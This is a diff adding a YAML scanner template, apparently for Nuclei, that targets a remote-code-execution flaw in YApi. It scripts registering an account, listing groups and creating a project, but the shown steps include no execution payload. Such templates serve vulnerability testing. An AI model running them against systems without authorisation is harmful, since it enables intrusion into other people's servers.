@@ -1,0 +1,52 @@
+id: yaml-poc-ymfe-yapi-rce-CT-194378
+info:
+  name: Yaml Poc Ymfe Yapi Rce Ct 194378
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-ymfe-yapi-rce-CT-194378'
+  tags: rce
+  reference:
+  - https://www.jianshu.com/p/b1f79f346eca
+http:
+- method: POST
+  path:
+  - /api/user/reg
+  body: '{"email":"{{redemail}}@qq.com","password":"{{redpassword}}","username":"{{redemail}}"}
+
+    '
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /api/group/list
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - custom_field1
+- method: POST
+  path:
+  - /api/project/add
+  body: '{"name":"{{redproject}}","basepath":"","group_id":"{{group_id}}","icon":"code-o","color":"cyan","project_type":"private"}
+
+    '
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - 成功！
